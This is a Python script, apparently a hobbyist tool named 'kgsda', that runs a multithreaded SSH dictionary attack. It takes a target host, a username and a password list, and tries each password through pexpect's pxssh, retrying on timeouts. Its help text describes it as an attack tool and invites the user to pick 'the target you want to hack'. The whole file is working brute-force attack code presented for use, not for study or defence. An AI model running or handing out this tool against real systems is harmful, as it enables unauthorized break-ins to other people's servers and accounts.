from pexpect import pxssh
import time
import threading
import textwrap
import argparse



maxConnections = 50
connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = ''
Fails = 0



def connect(target, user, password, release):
    global Found
    global Fails



    try:
        s = pxssh.pxssh()
        print("[-] Testing: "+ str(password))
        s.login(target, user, password)
        Found = password
        print("[*] Exiting: Password Found: "+ Found)

    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(target, user, password, Found)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(target, user, password, Found)

    finally:
        if release: connection_lock.release()


def main(target, user, filename):

    threads = []

    with open(filename, 'r') as t:
        for line in t.readlines():
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            new_thread = threading.Thread(target=connect, args=(target, user, password, True))
            print("[-] Testing: "+ str(password))
            new_thread.start()
            threads.append(new_thread)
            if Found:
                break
            if Fails > 5:
                print("[!] Too many timeouts")
                break

    #文件遍历结束后，将主程序挂起，等待其他在threads中的thread执行完毕
    for thread in threads:
        thread.join()


if __name__ == '__main__':

    print(textwrap.dedent(
    '''

    ██╗  ██╗██╗   ██╗ ██████╗  ██████╗ ███████╗███████╗
    ██║ ██╔╝╚██╗ ██╔╝██╔════╝ ██╔═══██╗██╔════╝██╔════╝
    █████╔╝  ╚████╔╝ ██║  ███╗██║   ██║███████╗███████╗
    ██╔═██╗   ╚██╔╝  ██║   ██║██║   ██║╚════██║╚════██║
    ██║  ██╗   ██║   ╚██████╔╝╚██████╔╝███████║███████║
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝                                                                      
    '''))

    myparser = argparse.ArgumentParser(
        prog='kgsda', 
        description='This is a simple SSH dictionary attack tool :)', 
        formatter_class=argparse.RawDescriptionHelpFormatter, #表示description和epilog不需要自动换行
        epilog=textwrap.dedent( #textwrap.dedent表示自动将多行字符串的前面的空白补齐
        '''
        examples:
            python kgsshda.py -t 127.0.0.1 -u root -f ./passwords.txt

        '''
        ))
    myparser.add_argument('-t', '--target', default='127.0.0.1', help='the target you want to hack') 
    myparser.add_argument('-u', '--user', help='the user you want to hack')
    myparser.add_argument('-f', '--filename', help='the passwords file you want to use')
    args = myparser.parse_args() #args是命名空间，这行命令将用户输入的参数去掉双杠后作为命名空间的属性
    target = args.target
    user = args.user
    filename = args.filename
    if target and user and filename:
        main(target, user, filename)
    else:
        print('Wrong usage. Please use -h or --help to learn more.')


